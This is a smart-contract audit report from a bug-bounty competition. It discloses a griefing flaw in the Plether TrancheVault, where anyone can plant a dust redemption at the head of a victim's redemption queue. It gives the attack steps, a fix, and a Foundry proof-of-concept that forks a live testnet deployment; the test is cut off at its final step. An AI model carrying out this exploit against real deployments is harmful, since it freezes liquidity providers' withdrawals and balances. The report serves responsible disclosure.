# \#99094 [SC-Low] Controller-Queue Hijack

**Submitted on Nov 11th 2026 at 20:41:11 UTC by @Petrus for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99094
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
An unauthenticated attacker can assign a refundable dust redemption to any victim’s controller queue, causing the victim’s standard withdrawal and redemption functions to return zero or revert

## Vulnerability Details


`TrancheVault.requestRedeem` lets anyone book a redemption under **any** `controller` address without that controller's consent. The vault's standard ERC-7540 claim functions only ever look at the **first entry** of the controller's request queue. An attacker can therefore put a worthless 1-share-unit request at the front of a victim's queue. It blocks the victim's real redemptions until the victim clears it, and clearing it freezes the victim's whole share balance for one hour.

Take a look at the Breakdown of the Issue:

**1. The request entry point never checks `controller`; only `owner` is authorized:**

```solidity
    function requestRedeem(
        uint256 shares,
        address controller,
        address owner
    ) external returns (uint256 requestId) {
        if (controller == address(0) || owner == address(0)) {
            revert TrancheVault__ZeroAddress();
        }
        if (shares == 0) {
            revert TrancheVault__WithdrawalTooSmall();
        }
        if (block.timestamp < lastDepositTime[owner] + DEPOSIT_COOLDOWN) {
            revert TrancheVault__DepositCooldown();
        }
        uint256 maxShares = maxRequestRedeem(owner);
        if (shares > maxShares) {
            revert TrancheVault__ExceededMaxRequestRedeem(owner, shares, maxShares);
        }
        _requireMinimumRedeemSize(shares, maxShares);
      @>  if (msg.sender != owner && !isOperator[owner][msg.sender]) {   // only the OWNER is authorized
            _spendAllowance(owner, msg.sender, shares);
        }
        _transfer(owner, address(this), shares);

     @>   requestId = _enqueueRedeemRequest(shares, controller);        // booked under an UNCHECKED controller
        emit RedeemRequest(controller, owner, requestId, msg.sender, shares);
    }
```

**2. The request is appended to the controller's personal queue:**

```solidity
    function _enqueueRedeemRequest(
        uint256 shares,
        address controller
    ) internal returns (uint256 requestId) {
        // Both request paths need a permanent receiver for any eventual refund-share dust.
        if (seedReceiver == address(0)) {
            revert TrancheVault__InvalidSeedPosition();
        }
        (requestId,) = _requestEpochWindow();
        RedeemEpoch storage epoch = redeemEpochs[requestId];
        if (!redeemEpochQueueState[requestId].queued) {
            _appendRedeemEpoch(requestId);
        }
        RedeemPosition storage position = redeemRequests[controller][requestId];
        if (!position.queued) {
     @>       _appendControllerRedeem(controller, requestId);          // attacker entry becomes victim's queue head
        }
        epoch.shares += shares;
        position.shares += shares;
        pendingRedeemEscrowShares += shares;
    }
```

**3. A full-balance request skips the 1 USDG minimum, so a 1-unit request worth 0 USDG is accepted:**

```solidity
    function _requireMinimumRedeemSize(
        uint256 shares,
        uint256 maxShares
    ) internal view {
        if (estimateRedeemAssets(shares) < POOL.minTrancheDepositAssets() && shares < maxShares) {
            revert TrancheVault__WithdrawalTooSmall();
        }
    }
```

**4. The standard ERC-7540 limits and claims read only the queue head:**

```solidity
    function maxWithdraw(
        address controller
    ) public view override returns (uint256) {
        uint256 requestId = controllerRedeemHead[controller];
        return requestId == 0 ? 0 : claimableRedeemAssets(requestId, controller);
    }

    function maxRedeem(
        address controller
    ) public view override returns (uint256) {
        uint256 requestId = controllerRedeemHead[controller];
        return requestId == 0 ? 0 : claimableRedeemRequest(requestId, controller);
    }

    function withdraw(
        uint256 assets,
        address receiver,
        address controller
    ) public override returns (uint256 shares) {
        return _claimWithdraw(controllerRedeemHead[controller], assets, receiver, controller);
    }

    function redeem(
        uint256 shares,
        address receiver,
        address controller
    ) public override returns (uint256 assets) {
        return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
    }
```

**5. The only way to clear a refunded head restarts the victim's cooldown on their entire balance:**

```solidity
    function claimRedeemRefund(
        uint256 requestId,
        address receiver,
        address controller
    ) external returns (uint256 shares) {
        _requireControllerAuth(controller);
        if (receiver == address(0)) {
            revert TrancheVault__ZeroAddress();
        }
        RedeemEpoch storage epoch = redeemEpochs[requestId];
        RedeemPosition storage position = redeemRequests[controller][requestId];
        if (!epoch.refundEnabled || position.refundClaimed || position.shares == 0) {
            revert TrancheVault__RedeemRefundUnavailable();
        }
        shares = refundableRedeemRequest(requestId, controller);
      @>  _requireShareReceiver(controller, receiver);                  // receiver must be the victim
        position.refundClaimed = true;
        epoch.refundBasisClaimed += position.shares;
        if (shares != 0) {
            position.refundedShares += shares;
            epoch.refundedShares += shares;
            pendingRedeemEscrowShares -= shares;
        }
        _maybeProcessRedeemFunding(controller, requestId);
        _sweepRedeemRefundDust(epoch);
        _maybeCloseRedeemPosition(controller, requestId);
        if (shares != 0) {
        @>      lastDepositTime[receiver] = block.timestamp;              // victim's whole-balance cooldown restarts
            _transfer(address(this), receiver, shares);
        }
        emit RedeemSharesRefunded(controller, receiver, requestId, shares);
    }
```

## Explanation

Each controller has a first-in, first-out (FIFO) queue of redemption requests, and `maxRedeem`, `maxWithdraw`, `redeem` and `withdraw` only work on the first one. Because `requestRedeem` never checks the `controller` argument, an attacker can create the victim's first entry: a request for 1 share unit worth 0 USDG. When the epoch settles, HousePool refunds it because it's worthless. That removes it from the global queue but leaves it at the front of the victim's queue. Only the victim can remove it, through `claimRedeemRefund`, and that call resets the victim's cooldown on all their shares.

This vulnerability simply means:

`TrancheVault` is the asynchronous (ERC-7540) entry point for HousePool's Junior and Senior LP tranches:
- LPs request redemptions, and keepers fund them at hourly epochs.
- Funded amounts are claimed through the standard ERC-4626/7540 functions.
- Any shares returned to a wallet restart a one-hour cooldown on that wallet's whole balance.


However, this issue is Reachable in production due to On the live deployment, any holder of one Junior share unit can call the permissionless `requestRedeem(1, victim, self)`, and the normal permissionless keeper settlement refunds that zero-value epoch while leaving it at the head of the victim's queue. The only precondition is that no other LP redeems from the Junior tranche in that same hourly epoch.


The targeted LP sees `maxRedeem`/`maxWithdraw` return 0 and `redeem`/`withdraw` revert on a funded redemption, and restoring them through `claimRedeemRefund` freezes the LP's entire share balance for one hour.

## Impact

This issue is Griefing due to  an unauthorized third party can block a victim's standard ERC-7540 redemption claims and force a one-hour freeze (no transfers, no new redemption requests) on all of the victim's shares, at negligible cost and with no profit.

## Attack path

1. The attacker moves 1 Junior share unit (worth 0 USDG) to a fresh address. The address inherits the attacker's already-expired cooldown.
2. The fresh address calls `requestRedeem(1, victim, fresh)`. The full-balance exemption admits it, and it becomes `controllerRedeemHead[victim]`.
3. A keeper settles the epoch. The worthless epoch is refunded but stays at the head of the victim's queue.
4. The victim's later real redemption is funded, yet `maxRedeem`/`maxWithdraw` read 0 and `redeem`/`withdraw` revert.
5. The victim calls `claimRedeemRefund` to clear the head, and their whole balance is frozen for one hour. The attacker can repeat this in later epochs.

## Recommended fix

Require the controller's consent before booking a request under it: `msg.sender` must be the controller or one of its approved operators. Third-party funded requests then still work through operator approval, but outsiders can no longer insert entries into another LP's queue.

```diff
     function requestRedeem(
         uint256 shares,
         address controller,
         address owner
     ) external returns (uint256 requestId) {
         if (controller == address(0) || owner == address(0)) {
             revert TrancheVault__ZeroAddress();
         }
+        // A request may only be booked under a controller the caller is, or is approved to act for.
+        if (msg.sender != controller && !isOperator[controller][msg.sender]) {
+            revert TrancheVault__NotControllerOrOperator();
+        }
         if (shares == 0) {
             revert TrancheVault__WithdrawalTooSmall();
         }
```

Add the same check to the deposit path (`_requireRequestDepositPreflight`) so that both request types are consistent.




## Proof of Concept

## Proof of Concept

Put the test in this path: test/

Run the test with: forge test --match-test test_LiveRelease_ThirdPartyDustRedeemPoisonsVictimQueueHeadAndForcesWholeBalanceCooldown -vvvv



```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {MockUSDG} from "../script/DeployPerpsArbitrumSepolia.s.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {Test} from "forge-std/Test.sol";


contract ControllerQueueHeadGriefingPoC is Test {

    function test_LiveRelease_ThirdPartyDustRedeemPoisonsVictimQueueHeadAndForcesWholeBalanceCooldown() public {
        // Deployed v2.0.0 release (deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/addresses.env).
        address releaseOwner = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B;
        address livePyth = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;
        MockUSDG usdg = MockUSDG(0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D);
        CfdEngine engine = CfdEngine(0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA);
        HousePool pool = HousePool(0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e);
        TrancheVault juniorVault = TrancheVault(0x4A8b67184a1E3224c11A191cc69F22C50EEf734e);
        OrderRouter router = OrderRouter(0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444);
        PletherOracle oracle = PletherOracle(0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2);

        // Fresh actors. The keeper is permissionless and pays the live Pyth fee, which is zero for these payloads.
        address victim = address(0xB0B0);
        address attacker = address(0xA77A);
        address attackerSybil = address(0xA77B);
        address keeper = address(0x4EE9);
        address victimColdWallet = address(0xC01D);

        // Exact `bytes[]` the real keeper (0xc60408d3...) passed to OrderRouter.settleLpEpoch on-chain.
        bytes[] memory nov4KeeperPythUpdate = new bytes[](1);
        nov4KeeperPythUpdate[0] =
            hex"504e415501000000012401000000010301ed9c7608ee1714a561c1043422075bf21a29191c7da97e6450ca453fd22da9c9085425d4008b33bf018cf30c315139f22545daceeac705657c8b530cf089a18b00028a550439786e1f6f8c4653adb69d6a3629ae288031332f9f2678e79b8704e6a4373aecd06bed06dd3d754ffe25ad03f847fb01f9fbed1eebe9028e2f60e7983f0004e0670792f0d81ca14a20f5f3dc8f9ffd12e2c9bed6d188bfb26c65fb70051b5340038f3785561c20925a84dd2c69252d9e96708c390f5e88f79b11a2e1bf1bac006aeaadc700000000001a507974686e6574507974686e6574507974686e6574507974686e657450797468000000085a55938c004155575600000000085a55938c000000006fa2a1b3621c4dbd4834bddb1b75858b848369b606005500a995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b000000000001b7420000000000000002fffffffb000000006aeaadc7000000006aeaadc6000000000001b74600000000000000030c93ce1edd6c36023953123cac0ae440ed932dfba822d40a123fbbeec1c5aef2ab40e189b0ab5bb275f4f21cb5d1e5ddc00664451c3e910c604bd69fa9e88cc6fc9a4398c841117f3130897519c5e2a049afa5422ce6d43c15f35c5a255b1802409613483fe08a0d76e083b29d0e9f3003c99dc8e6a8c94804f0d492674a03f6c7a585dd1ecfc795e6309d82e8e1bb3ce2664c7551c9469a4544e0d01f0757c27bc1c5d1f09b4490256e7a82b4b2eef134a28d579d61d6b1d5dcc1967b17efcdf2934f0fb9d7af70f31110c5dfdb46f3ea92df0e8397d47bcbc112aa849ce02fa31780c5d790bf30545ba9e29e659e0be2005500ef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd5200000000000267f20000000000000006fffffffd000000006aeaadc7000000006aeaadc6000000000002681e00000000000000060c84f16380217912754a05b25017dbf2536eda0af16fe52db0fc53be1d36f2192081b6bfd0abb96d7b690d0f0f24a80301738c6f57149b64936f63a454b4d3614a86762bae423b619d269951522f78acd2afa5422ce6d43c15f35c5a255b1802409613483fe08a0d76e083b29d0e9f3003c99dc8e6a8c94804f0d492674a03f6c7a585dd1ecfc795e6309d82e8e1bb3ce2664c7551c9469a4544e0d01f0757c27bc1c5d1f09b4490256e7a82b4b2eef134a28d579d61d6b1d5dcc1967b17efcdf2934f0fb9d7af70f31110c5dfdb46f3ea92df0e8397d47bcbc112aa849ce02fa31780c5d790bf30545ba9e29e659e0be200550084c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c10000000000020df50000000000000004fffffffb000000006aeaadc7000000006aeaadc60000000000020ded00000000000000050cdc4fc6c37e09e5f8c889c910f5b386884a7eb5b322d40a123fbbeec1c5aef2ab40e189b0ab5bb275f4f21cb5d1e5ddc00664451c3e910c604bd69fa9e88cc6fc9a4398c841117f3130897519c5e2a049afa5422ce6d43c15f35c5a255b1802409613483fe08a0d76e083b29d0e9f3003c99dc8e6a8c94804f0d492674a03f6c7a585dd1ecfc795e6309d82e8e1bb3ce2664c7551c9469a4544e0d01f0757c27bc1c5d1f09b4490256e7a82b4b2eef134a28d579d61d6b1d5dcc1967b17efcdf2934f0fb9d7af70f31110c5dfdb46f3ea92df0e8397d47bcbc112aa849ce02fa31780c5d790bf30545ba9e29e659e0be20055003112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca00000000000221880000000000000005fffffffb000000006aeaadc7000000006aeaadc6000000000002219f00000000000000050c28db5ed5a78c42a667af05beae5c274e2189f29600dcbf0df9b9bde009590c4a60222fa843dafc87690d0f0f24a80301738c6f57149b64936f63a454b4d3614a86762bae423b619d269951522f78acd2afa5422ce6d43c15f35c5a255b1802409613483fe08a0d76e083b29d0e9f3003c99dc8e6a8c94804f0d492674a03f6c7a585dd1ecfc795e6309d82e8e1bb3ce2664c7551c9469a4544e0d01f0757c27bc1c5d1f09b4490256e7a82b4b2eef134a28d579d61d6b1d5dcc1967b17efcdf2934f0fb9d7af70f31110c5dfdb46f3ea92df0e8397d47bcbc112aa849ce02fa31780c5d790bf30545ba9e29e659e0be20055008ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc67600000000000ee1600000000000000082fffffffb000000006aeaadc7000000006aeaadc600000000000edf8200000000000000870c450b0f71354c49f013dd61ce77b717c39e898c6446670366efaf82709e1660df14e095b9e02be2e2b441a5125bd485980252bea77ae842f500e366c0abb0d864b68272391b6ce2c3bacba8ab5f942540ac11e0019979dfd0d59473a5afbd82c62e965dc365807d20609a8478d04abcfc22df7f6debcd25a6b645da76fbdea844cdc7051f522509a95c2632c14fac6d221d2c43ccd504ad195aff9e6bef62c48d460ec80878b95767ca47cc94e4428abdd5ca842f6342bfa57dc75da7424ce9685a2db0dcbfdde1d51110c5dfdb46f3ea92df0e8397d47bcbc112aa849ce02fa31780c5d790bf30545ba9e29e659e0be20055000b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f80000000000013e250000000000000003fffffffb000000006aeaadc7000000006aeaadc60000000000013e3400000000000000050c8ca139ca8121b0fbe27eb01f472128ad176d6f8b6fe52db0fc53be1d36f2192081b6bfd0abb96d7b690d0f0f24a80301738c6f57149b64936f63a454b4d3614a86762bae423b619d269951522f78acd2afa5422ce6d43c15f35c5a255b1802409613483fe08a0d76e083b29d0e9f3003c99dc8e6a8c94804f0d492674a03f6c7a585dd1ecfc795e6309d82e8e1bb3ce2664c7551c9469a4544e0d01f0757c27bc1c5d1f09b4490256e7a82b4b2eef134a28d579d61d6b1d5dcc1967b17efcdf2934f0fb9d7af70f31110c5dfdb46f3ea92df0e8397d47bcbc112aa849ce02fa31780c5d790bf30545ba9e29e659e0be2";
        bytes[] memory nov8KeeperPythUpdate = new bytes[](1);
        nov8KeeperPythUpdate[0] =
            hex"504e4155010000000124010000000103014ad2eef8a473e8c7fc27c2afaf8009ff5fc71084ba02c436857d0442a811ec261ae66cc654cbb1053bdd2f046c0a7d4e9f206cd7d00981567be9e54fd7d417430002fe1f3ddb220e0360b72957fa05a58dfba84909f5f983cd0ed56d25220c635c0119a684d706db0de181bd5468f2160af218c204a21cbaee6b13460f12bcbd52b200045ec77e6902b7dc1a1ba1befc9c6bb2613ab592b47222b2e596d5f970338addfb3fd5931648a0310cc4f4f194e587aaf2f4169456f1a9449ac17447ef5169d8af016af0f0ec00000000001a507974686e6574507974686e6574507974686e6574507974686e657450797468000000085ad2d270004155575600000000085ad2d270000000002bf8832af08944a81956ce4130d226b97b727f6f06005500a995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b000000000001b33a0000000000000031fffffffb000000006af0f0ec000000006af0f0eb000000000001b33a000000000000002e0c140eb822e86bf8a2de0c3f1e192fbf586485e081a4f8c867dfff7cfa71b252c463bf29b0f92c4f89d49f397f1a0a537069f59fa0563e7b55900a3a8220c0b7df49ac72d28556683f3a9b0f9e222ef95ad143c3848f65254a2b2e60eb921d9164695b4d9513005b5239fec425d734081c2805214f81875a69dfa0524164fa08568376606a3261ec9830c0ee6268daa47c3923d25adff926f103a0bc9a8a828955817a83608a7e6e075137f4780a9b86b26b23a2ab580b36aedf0bfd3f02c3e5db21c76f543ef1ad7d18dd22cf5096c7d562e9f991b5c90ea6f1b79ab6ee9b056dd36c7f2bb4c5d92ad6fca551886d949f005500ef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd520000000000026ab3000000000000003afffffffd000000006af0f0ec000000006af0f0eb0000000000026ab5000000000000003a0c2aaa2da7f5eb3fc38d5d81e786c828d2f5e1d0280c23dfac9ad8326bb2e8c46a1569aaa6845ada62b1bcee9c4d846ea030762c5022f4fe5470214347dcd371295bf7404eaf47edd91baa941705fe7d36d143c3848f65254a2b2e60eb921d9164695b4d9513005b5239fec425d734081c2805214f81875a69dfa0524164fa08568376606a3261ec9830c0ee6268daa47c3923d25adff926f103a0bc9a8a828955817a83608a7e6e075137f4780a9b86b26b23a2ab580b36aedf0bfd3f02c3e5db21c76f543ef1ad7d18dd22cf5096c7d562e9f991b5c90ea6f1b79ab6ee9b056dd36c7f2bb4c5d92ad6fca551886d949f00550084c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1000000000002097c0000000000000035fffffffb000000006af0f0ec000000006af0f0eb000000000002097c00000000000000290c3713d6a282409aa6288bb1609dd4550911ef9668a4f8c867dfff7cfa71b252c463bf29b0f92c4f89d49f397f1a0a537069f59fa0563e7b55900a3a8220c0b7df49ac72d28556683f3a9b0f9e222ef95ad143c3848f65254a2b2e60eb921d9164695b4d9513005b5239fec425d734081c2805214f81875a69dfa0524164fa08568376606a3261ec9830c0ee6268daa47c3923d25adff926f103a0bc9a8a828955817a83608a7e6e075137f4780a9b86b26b23a2ab580b36aedf0bfd3f02c3e5db21c76f543ef1ad7d18dd22cf5096c7d562e9f991b5c90ea6f1b79ab6ee9b056dd36c7f2bb4c5d92ad6fca551886d949f0055003112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca000000000002278d000000000000004cfffffffb000000006af0f0ec000000006af0f0eb000000000002279200000000000000570c0baa27b8c703f7047b0a5bc7508df5f29313723ee69417b9e5a75535bdb411e3b5311a4c136762b0b1bcee9c4d846ea030762c5022f4fe5470214347dcd371295bf7404eaf47edd91baa941705fe7d36d143c3848f65254a2b2e60eb921d9164695b4d9513005b5239fec425d734081c2805214f81875a69dfa0524164fa08568376606a3261ec9830c0ee6268daa47c3923d25adff926f103a0bc9a8a828955817a83608a7e6e075137f4780a9b86b26b23a2ab580b36aedf0bfd3f02c3e5db21c76f543ef1ad7d18dd22cf5096c7d562e9f991b5c90ea6f1b79ab6ee9b056dd36c7f2bb4c5d92ad6fca551886d949f0055008ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc67600000000000f1940000000000000083ffffffffb000000006af0f0ec000000006af0f0eb00000000000f19b000000000000004d60c98c350f1e2ac8b5e790521f3509c2e4f7fa124cf5ba6ffb1b271c87282e576dd73a46b9570b3ef26a135f22a226c71bb746a9ae86e49ebee4d9bd74a0e2add9b8fea423430ab100bd26fd3035c4d0e7df0d01bb6f290a24833a808207a914b4590cf44c411b34c10c3b86811ce268cb4470ba86727a06cdefa4d50855b4765586bfdaea5ecf962b276ce2d3b22cb4fc2d68c8768eac6c654022c7982057038deef42edb419f8d7c3ecdb3e51b88542fb487f6b4e857a7f08c1cce529a4267ca2031917ea82025d6b18dd22cf5096c7d562e9f991b5c90ea6f1b79ab6ee9b056dd36c7f2bb4c5d92ad6fca551886d949f0055000b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8000000000001401e000000000000004afffffffb000000006af0f0ec000000006af0f0eb0000000000014022000000000000004c0c4b87171d02319f1b99fac2744cececa8594464400c23dfac9ad8326bb2e8c46a1569aaa6845ada62b1bcee9c4d846ea030762c5022f4fe5470214347dcd371295bf7404eaf47edd91baa941705fe7d36d143c3848f65254a2b2e60eb921d9164695b4d9513005b5239fec425d734081c2805214f81875a69dfa0524164fa08568376606a3261ec9830c0ee6268daa47c3923d25adff926f103a0bc9a8a828955817a83608a7e6e075137f4780a9b86b26b23a2ab580b36aedf0bfd3f02c3e5db21c76f543ef1ad7d18dd22cf5096c7d562e9f991b5c90ea6f1b79ab6ee9b056dd36c7f2bb4c5d92ad6fca551886d949f";

        // =============================================================================================
        // STEP 0 - Fork the live release right after its real 2026-11-02 08:00 UTC settlement.
        // =============================================================================================
        vm.createSelectFork(
            vm.envOr("ARB_SEPOLIA_RPC_URL", string("https://arbitrum-sepolia.gateway.tenderly.co")), 325_253_812
        );

        assertEq(
            address(juniorVault).codehash,
            0x8d00d3d0273b7a321cbf61232ea79ef0b503fe0d83bb52609321765a0a04f3bf,
            "deployed Junior vault bytecode = release manifest"
        );
        assertEq(
            address(pool).codehash,
            0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957,
            "deployed HousePool bytecode = release manifest"
        );
        assertEq(
            address(router).codehash,
            0x6c65de67ef2824572537e3641a71100100c49d909b196c43e5d271312534d3cf,
            "deployed OrderRouter bytecode = release manifest"
        );
        assertEq(
            address(oracle).codehash,
            0x1ecb1ca760e7ba51d958697eeefe06ff7ba1a3ad162b3e7978af3df30393bc13,
            "deployed PletherOracle bytecode = release manifest"
        );
        assertEq(
            address(engine).codehash,
            0xa0f8e5be6e622a5a83e46e88f6b012757ef924cf613a50cba52a2b5c66b76a6b,
            "deployed CfdEngine bytecode = release manifest"
        );
        assertEq(
            address(usdg).codehash,
            0x12233a5f6b0abf6a0f8447e56f9507afdd142a78cc42ebb0d041a3997bd299f6,
            "deployed Mock USDG settlement token = release manifest"
        );
        assertEq(address(oracle.pyth()), livePyth, "release oracle reads the live Pyth contract");
        assertGt(livePyth.code.length, 0, "live Pyth bytecode comes from Arbitrum Sepolia, not a local mock");
        assertEq(address(router.pletherOracle()), address(oracle), "router is bound to the release oracle");

        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior exposure cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share cap");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "release opening minimum");
        assertEq(router.maxPendingOrders(), 5, "release pending-order limit");
        assertEq(oracle.adverseConfidenceMultiplierBps(), 2500, "release adverse confidence multiplier");
        assertEq(oracle.basketMaxConfidenceRatioBps(), 10, "release basket confidence ratio");
        assertEq(engine.CAP_PRICE(), 2e8, "release CAP_PRICE");
        assertEq(juniorVault.maintenanceFeeAprBps(), 0, "release Junior maintenance fee");
        assertEq(juniorVault.seedReceiver(), releaseOwner, "release Junior seed receiver");
        assertTrue(pool.isTradingActive(), "live release is trading");
        assertFalse(engine.isOracleFrozen(), "Monday live FX session");
        assertFalse(engine.degradedMode(), "release is healthy");

        (, uint256 liveLongOpenInterest,,) = engine.sides(0);
        assertGt(liveLongOpenInterest, 0, "real trader exposure is open against the pool");
        assertGt(pool.juniorPrincipal(), 100_000_000e6, "~101M USDG of real Junior liquidity");
        assertLe(vm.getBlockTimestamp() - engine.lastMarkTime(), 15, "real Pyth mark is seconds old");
        assertGt(engine.lastMarkPrice(), 95_000_000, "real six-currency FX basket mark");
        assertLt(engine.lastMarkPrice(), 98_000_000, "real six-currency FX basket mark");
        assertEq(juniorVault.redeemQueueHead(), 0, "no live Junior redemption is queued");
        assertEq(juniorVault.convertToAssets(1), 0, "one Junior share unit is worth zero USDG at the live NAV");

        // =============================================================================================
        // STEP 1 - Setup: a real LP (victim) and the attacker request Junior deposits on the live pool.
        // =============================================================================================
        usdg.mint(victim, 25_000e6);
        usdg.mint(attacker, 1000e6);

        vm.startPrank(victim);
        usdg.approve(address(juniorVault), 25_000e6);
        uint256 depositEpoch = juniorVault.requestDeposit(25_000e6, victim, victim);
        vm.stopPrank();

        vm.startPrank(attacker);
        usdg.approve(address(juniorVault), 1000e6);
        assertEq(juniorVault.requestDeposit(1000e6, attacker, attacker), depositEpoch, "both LPs join one epoch");
        vm.stopPrank();

        // The next real settlement is the keeper's 2026-11-04 04:00:12 UTC call (tx 0xf50e4afe...).
        vm.warp(1_793_764_812);
        assertGe(vm.getBlockTimestamp(), pool.lpEpochStart(depositEpoch), "deposit epoch has matured");
        vm.prank(keeper);
        router.settleLpEpoch(nov4KeeperPythUpdate);

        assertGe(engine.lastMarkTime(), pool.lpEpochStart(pool.currentLpEpoch()), "live Pyth mark is post-boundary");
        assertGt(engine.lastMarkPrice(), 95_000_000, "real FX basket mark after the Nov 4 settlement");
        assertLt(engine.lastMarkPrice(), 98_000_000, "real FX basket mark after the Nov 4 settlement");

        vm.prank(victim);
        uint256 victimShares = juniorVault.claimDeposit(depositEpoch, 25_000e6, victim, victim);
        vm.prank(attacker);
        uint256 attackerShares = juniorVault.claimDeposit(depositEpoch, 1000e6, attacker, attacker);
        assertApproxEqRel(
            juniorVault.convertToAssets(victimShares), 25_000e6, 0.001e18, "victim holds ~25,000 USDG at the live NAV"
        );
        assertEq(juniorVault.controllerRedeemHead(victim), 0, "victim has no redemption request of their own yet");

        // =============================================================================================
        // STEP 2 - Both deposit lots age past the release one-hour cooldown.
        // =============================================================================================
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());
        assertEq(juniorVault.maxRequestRedeem(victim), victimShares, "victim's whole balance is unlocked");
        assertEq(juniorVault.maxRequestRedeem(attacker), attackerShares, "attacker's balance is unlocked");

        // =============================================================================================
        // STEP 3 - Attack: a 1-share-unit redemption is filed with the victim as controller, without consent.
        // =============================================================================================
        vm.prank(attacker);
        juniorVault.transfer(attackerSybil, 1);
        assertEq(juniorVault.maxRequestRedeem(attackerSybil), 1, "fresh sybil inherits the attacker's elapsed cooldown");
        assertLt(
            juniorVault.estimateRedeemAssets(1),
            pool.minTrancheDepositAssets(),
            "request is far below the 1 USDG minimum and only passes via the full-balance exemption"
        );
        assertFalse(juniorVault.isOperator(victim, attackerSybil), "victim never approved the attacker as operator");

        vm.prank(attackerSybil);
        uint256 poisonId = juniorVault.requestRedeem(1, victim, attackerSybil);

        (uint256 poisonShares,,,,,, bool poisonQueued,,) = juniorVault.redeemRequests(victim, poisonId);
        assertEq(poisonShares, 1, "attacker's dust is booked under the victim's controller");
        assertTrue(poisonQueued, "the dust entry is linked into the victim's controller queue");
        assertEq(juniorVault.controllerRedeemHead(victim), poisonId, "attacker's entry is now the victim's queue head");

        // =============================================================================================
        // STEP 4 - The victim later files a genuine redemption for half of their position.
        // =============================================================================================
        vm.warp(pool.lpEpochStart(poisonId));
        uint256 victimRedeemShares = victimShares / 2;
        vm.prank(victim);
        uint256 victimRequestId = juniorVault.requestRedeem(victimRedeemShares, victim, victim);
        assertGt(victimRequestId, poisonId, "victim's real request queues behind the attacker's entry");

        // =============================================================================================
        // STEP 5 - The next real keeper settlement (2026-11-08 22:00:15 UTC, tx 0x3a51a93a...) refunds the
        //          worthless epoch and fully funds the victim, but the victim's head stays on the dust.
        // =============================================================================================
        vm.warp(1_794_175_215);
        vm.prank(keeper);
        router.settleLpEpoch(nov8KeeperPythUpdate);

        assertGe(engine.lastMarkTime(), pool.lpEpochStart(pool.currentLpEpoch()), "live Pyth mark is post-boundary");
        assertGt(engine.lastMarkPrice(), 95_000_000, "real FX basket mark after the Nov 8 settlement");
        assertLt(engine.lastMarkPrice(), 98_000_000, "real FX basket mark after the Nov 8 settlement");
        assertTrue(juniorVault.redeemRefundPending(poisonId, victim), "zero-value dust epoch was refunded, not funded");
        assertEq(juniorVault.redeemQueueHead(), 0, "both epochs left the global settlement queue");

        uint256 fundedShares = juniorVault.claimableRedeemRequest(victimRequestId, victim);
        uint256 fundedAssets = juniorVault.claimableRedeemAssets(victimRequestId, victim);
        assertEq(fundedShares, victimRedeemShares, "victim's real redemption is fully funded");
        assertApproxEqRel(fundedAssets, 12_500e6, 0.01e18, "~12,500 USDG sits in withdrawal escrow for the victim");
        assertEq(
            juniorVault.controllerRedeemHead(victim), poisonId, "BUG: the refunded dust still heads the victim's queue"
        );
        assertEq(
            juniorVault.maxRequestRedeem(victim),
            victimShares - victimRedeemShares,
            "before any clearing, the victim's remaining wallet balance is freely usable"
        );

        // =============================================================================================
        // STEP 6 - IMPACT 1: the victim's standard ERC-7540 claim surface is blocked by the attacker's entry.
        // =============================================================================================
        assertEq(juniorVault.maxRedeem(victim), 0, "IMPACT: maxRedeem reports nothing despite a funded request");
        assertEq(juniorVault.maxWithdraw(victim), 0, "IMPACT: maxWithdraw reports nothing despite funded USDG");

        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, victim, fundedShares, 0));
        juniorVault.redeem(fundedShares, victim, victim);

        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, victim, fundedAssets, 0));
        juniorVault.withdraw(fundedAssets, victim, victim);

        // =============================================================================================
        // STEP 7 - IMPACT 2: clearing the attacker's head restarts the victim's whole-balance cooldown.
        // =============================================================================================
